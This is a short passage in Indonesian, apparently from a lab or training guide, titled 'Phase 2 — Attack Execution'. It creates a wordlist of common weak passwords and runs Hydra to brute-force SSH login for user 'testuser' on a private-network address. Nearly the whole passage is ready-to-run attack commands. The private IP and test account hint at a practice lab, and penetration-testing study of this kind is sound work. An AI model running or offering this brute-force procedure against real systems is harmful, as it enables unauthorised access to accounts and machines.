## FASE 2 — EKSEKUSI SERANGAN (Kali Linux)

### Buat Wordlist
```bash
cat > /tmp/passwords.txt << EOF
password
123456
admin
Password1
qwerty
letmein
welcome
Password123
testuser
test123
abc123
EOF
```

### Jalankan Hydra
```bash
hydra -l testuser -P /tmp/passwords.txt ssh://192.168.1.19 -V -t 4
```

